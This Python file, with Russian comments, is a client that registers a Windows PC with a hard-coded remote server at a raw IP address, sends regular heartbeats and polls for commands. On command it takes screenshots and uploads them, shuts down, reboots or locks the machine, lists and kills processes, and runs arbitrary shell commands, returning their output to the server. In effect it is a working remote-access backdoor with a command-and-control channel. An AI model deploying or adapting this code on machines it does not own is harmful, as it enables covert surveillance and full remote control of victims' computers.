# client.py - исправленная версия с расширенным функционалом
import requests
import socket
import time
import platform
import hashlib
from threading import Thread
import uuid
import sys
import pyautogui
import os
import base64
import subprocess
import psutil
import ctypes
import json

# Конфигурация
SERVER_URL = "http://46.158.7.43:4443"  # Замените на ваш адрес сервера

def generate_device_id():
    """Генерирует уникальный ID устройства"""
    pc_name = platform.node()
    unique_hash = hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:6].upper()
    device_id = f"{pc_name}-{unique_hash}"
    return ''.join(e for e in device_id if e.isalnum() or e == '-')

def get_system_info():
    """Собирает информацию о системе"""
    return {
        "name": platform.node(),
        "os": platform.system(),
        "release": platform.release(),
        "processor": platform.processor(),
        "ip": socket.gethostbyname(socket.gethostname())
    }

class PCClient:
    def __init__(self):
        self.device_id = generate_device_id()
        self.system_info = get_system_info()
        self.running = True
        
    def register_device(self):
        """Регистрация устройства на сервере"""
        while self.running:
            try:
                data = {
                    "device_id": self.device_id,
                    "system_info": self.system_info,
                    "status": "online"
                }
                
                response = requests.post(
                    f"{SERVER_URL}/register",
                    json=data,
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"Устройство {self.device_id} успешно зарегистрировано")
                    return True
                else:
                    print(f"Ошибка регистрации: {response.status_code} - {response.text}")
                    time.sleep(30)
                    
            except requests.exceptions.RequestException as e:
                print(f"Ошибка подключения: {e}")
                print("Проверьте:")
                print(f"1. Сервер запущен по адресу {SERVER_URL}")
                print("2. Порт 8080 открыт в фаерволе")
                print("3. Сеть доступна")
                time.sleep(30)
                
        return False
    
    def take_screenshot(self):
        """Создание скриншота и отправка на сервер"""
        try:
            # Создаем скриншот
            screenshot = pyautogui.screenshot()
            
            # Сохраняем временно
            temp_file = f"screenshot_{self.device_id}.png"
            screenshot.save(temp_file)
            
            # Читаем файл и кодируем в base64
            with open(temp_file, "rb") as image_file:
                encoded_image = base64.b64encode(image_file.read()).decode('utf-8')
            
            # Удаляем временный файл
            os.remove(temp_file)
            
            # Отправляем на сервер
            response = requests.post(
                f"{SERVER_URL}/upload_screenshot",
                json={
                    "device_id": self.device_id,
                    "image": encoded_image
                },
                timeout=30
            )
            
            if response.status_code == 200:
                print("Скриншот успешно отправлен")
            else:
                print(f"Ошибка отправки скриншота: {response.text}")
                
        except Exception as e:
            print(f"Ошибка при создании скриншота: {e}")
    
    def send_heartbeat(self):
        """Регулярная отправка сигналов активности"""
        while self.running:
            try:
                response = requests.post(
                    f"{SERVER_URL}/heartbeat",
                    json={"device_id": self.device_id},
                    timeout=5
                )
                
                if response.status_code != 200:
                    print(f"Ошибка heartbeat: {response.text}")
                    
                time.sleep(60)
                
            except Exception as e:
                print(f"Ошибка отправки heartbeat: {e}")
                time.sleep(10)
    
    def check_commands(self):
        """Проверка команд от сервера"""
        while self.running:
            try:
                response = requests.get(
                    f"{SERVER_URL}/commands?device_id={self.device_id}",
                    timeout=10
                )
                
                if response.status_code == 200:
                    commands = response.json().get("commands", [])
                    for cmd in commands:
                        self.execute_command(cmd)
                elif response.status_code != 200:
                    print(f"Ошибка получения команд: {response.text}")
                
                time.sleep(5)
                
            except Exception as e:
                print(f"Ошибка проверки команд: {e}")
                time.sleep(10)
    
    def execute_command(self, command):
        """Выполнение полученной команды"""
        try:
            print(f"Получена команда: {command['command']}")
            result = ""
            
            if command['command'] == 'screenshot':
                self.take_screenshot()
                result = "Скриншот выполнен и отправлен"
                
            elif command['command'] == 'shutdown':
                subprocess.run(["shutdown", "/s", "/t", "0"])
                result = "Компьютер выключается"
                
            elif command['command'] == 'reboot':
                subprocess.run(["shutdown", "/r", "/t", "0"])
                result = "Компьютер перезагружается"
                
            elif command['command'] == 'lock':
                ctypes.windll.user32.LockWorkStation()
                result = "Компьютер заблокирован"
                
            elif command['command'] == 'sleep':
                subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"])
                result = "Компьютер переведен в спящий режим"
                
            elif command['command'] == 'processes':
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'username']):
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'user': proc.info['username']
                    })
                result = json.dumps(processes, indent=2, ensure_ascii=False)
                
            elif command['command'].startswith('killprocess:'):
                pid = int(command['command'].split(':')[1])
                try:
                    p = psutil.Process(pid)
                    p.terminate()
                    result = f"Процесс {pid} завершен"
                except Exception as e:
                    result = f"Ошибка завершения процесса {pid}: {str(e)}"
                
            elif command['command'].startswith('cmd:'):
                cmd = command['command'].split(':', 1)[1]
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
                    result = output
                except subprocess.CalledProcessError as e:
                    result = f"Ошибка выполнения команды: {e.output}"
                
            # Отправляем результат выполнения команды
            if result:
                requests.post(
                    f"{SERVER_URL}/command_result",
                    json={
                        "device_id": self.device_id,
                        "command_id": command['id'],
                        "result": result
                    }
                )
                
        except Exception as e:
            print(f"Ошибка выполнения команды: {e}")
            requests.post(
                f"{SERVER_URL}/command_result",
                json={
                    "device_id": self.device_id,
                    "command_id": command['id'],
                    "result": f"Ошибка выполнения команды: {str(e)}"
                }
            )
    
    def run(self):
        """Запуск клиента"""
        print(f"Запуск клиента с ID: {self.device_id}")
        
        if self.register_device():
            Thread(target=self.send_heartbeat, daemon=True).start()
            Thread(target=self.check_commands, daemon=True).start()
            
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.running = False
                print("Клиент остановлен")

if __name__ == '__main__':
    try:
        client = PCClient()
        client.run()
    except Exception as e:
        print(f"Фатальная ошибка: {e}")
        sys.exit(1)